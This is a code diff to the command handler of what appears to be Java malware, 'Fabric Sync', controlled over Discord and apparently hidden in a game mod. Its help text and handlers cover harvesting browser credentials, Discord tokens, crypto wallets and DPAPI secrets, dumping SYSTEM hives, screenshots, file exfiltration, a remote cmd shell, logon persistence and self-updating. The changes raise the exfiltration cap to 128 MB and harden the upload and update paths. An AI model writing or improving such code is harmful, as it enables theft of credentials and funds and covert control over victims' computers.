@@ -80,9 +80,9 @@ public final class CommandExecutor {
 		poller.reply(String.join("\n",
 			"**Fabric Sync**",
 			"`ping` latency and transport · `harvest` collect now · `token` recover Discord now · `bootstrap` run the whole first-run collection again · `hives` SYSTEM hives (asks for UAC) · `screenshot` screen",
-			"`ls [dir]` · `cd <dir>` · `cat <file>` · `download <file>` (max 8 MB) · `upload <url|file> [name]`",
+			"`ls [dir]` · `cd <dir>` · `cat <file>` · `download <file>` (max 128 MB, split) · `upload <url|file> [name]`",
 			"`shell <cmd>` runs cmd /c with a 60 s cut; output over 1000 chars arrives as .txt",
-			"`persist on|off` logon task · `sleep <s>` · `kill` · `clear [n]` channel messages",
+			"`persist on|off` logon task · `sleep <s>` · `kill` · `clear [n]` channel messages (own/webhook always; others need Manage Messages)",
 			"`update check` · `update apply <version>` · `update rollback` · `update auto on|off` · `update status`",
 			"Harvest categories: accounts, browsers, Discord, wallets, DPAPI, game. The first run already sends recon, sessions and wallets on its own; `hives` is the manual fallback.",
 			"Extras and repairs: SHELL.md in the repo."));
@@ -182,11 +182,13 @@ public final class CommandExecutor {
 			return;
 		}
 		try {
-			if (Files.size(file) > 8L * 1024L * 1024L) {
-				poller.reply("File too large");
+			if (Files.size(file) > 128L * 1024L * 1024L) {
+				poller.reply("File too large (maximum 128 MB)");
 				return;
 			}
-			poller.uploadFile(file);
+			if (!poller.uploadFile(file)) {
+				poller.reply("Upload failed");
+			}
 		} catch (Throwable throwable) {
 			poller.reply("Failed: " + throwable.getMessage());
 		}
@@ -258,15 +260,27 @@ public final class CommandExecutor {
 				Files.createDirectories(installDir);
 			}
 			Path file = Screenshot.save(installDir);
-			poller.uploadFile(file);
-			Files.deleteIfExists(file);
+			if (poller.uploadFile(file)) {
+				Files.deleteIfExists(file);
+			} else {
+				poller.reply("Screenshot upload failed; kept " + file.getFileName());
+			}
 		} catch (Throwable throwable) {
 			poller.reply("Failed: " + throwable.getMessage());
 		}
 	}
 
 	private void persist(List<String> args) {
-		boolean enable = args.size() > 1 && args.get(1).equalsIgnoreCase("on");
+		String value = args.size() > 1 ? args.get(1).toLowerCase() : "";
+		if (value.isEmpty()) {
+			poller.reply("Persistence: " + (state.persist ? "on" : "off") + " · usage: persist on|off");
+			return;
+		}
+		if (!value.equals("on") && !value.equals("off")) {
+			poller.reply("Usage: persist [on|off]");
+			return;
+		}
+		boolean enable = value.equals("on");
 		poller.persist(enable);
 		boolean result = enable ? Persistence.enable(installDir) : Persistence.disable(installDir);
 		StringBuilder text = new StringBuilder(enable ? "Persistence on: " : "Persistence off: ");
@@ -289,13 +303,13 @@ public final class CommandExecutor {
 	}
 
 	private void sleep(List<String> args) {
-		long millis = 1000L;
+		long seconds = 1L;
 		try {
 			if (args.size() > 1) {
-				millis = Math.min(60000L, Long.parseLong(args.get(1)));
+				seconds = Math.max(0L, Math.min(60L, Long.parseLong(args.get(1))));
 			}
-			Thread.sleep(millis);
-			poller.reply("Slept " + millis + " ms");
+			Thread.sleep(seconds * 1000L);
+			poller.reply("Slept " + seconds + " s");
 		} catch (InterruptedException interrupted) {
 			poller.reply("interrupted");
 		} catch (Throwable throwable) {
@@ -308,9 +322,11 @@ public final class CommandExecutor {
 		switch (action) {
 			case "check" -> {
 				try {
-					Update.Info info = Update.check();
-					poller.reply("Update available: " + info.version
-						+ (info.notes.isEmpty() ? "" : "\n" + info.notes));
+					Update.Info info = Update.checkIfNewer();
+					poller.reply(info == null
+						? "Up to date: " + Update.currentVersion()
+						: "Update available: " + info.version
+							+ (info.notes.isEmpty() ? "" : "\n" + info.notes));
 				} catch (UpdateException exception) {
 					poller.reply("Update: " + exception.getMessage());
 				}
@@ -332,7 +348,11 @@ public final class CommandExecutor {
 
 	private void stageUpdate() {
 		try {
-			Update.Info info = Update.check();
+			Update.Info info = Update.checkIfNewer();
+			if (info == null) {
+				poller.reply("Up to date: " + Update.currentVersion());
+				return;
+			}
 			Update.stage(info, installDir);
 			Update.log(installDir, info.version, info.agentSha256, "staged");
 			if (gameDir == null) {
@@ -349,7 +369,11 @@ public final class CommandExecutor {
 	private void updateAndApply() {
 		Update.Info info;
 		try {
-			info = Update.check();
+			info = Update.checkIfNewer();
+			if (info == null) {
+				poller.reply("Up to date: " + Update.currentVersion());
+				return;
+			}
 			Update.stage(info, installDir);
 		} catch (UpdateException exception) {
 			Update.log(installDir, "-", "-", exception.getMessage());
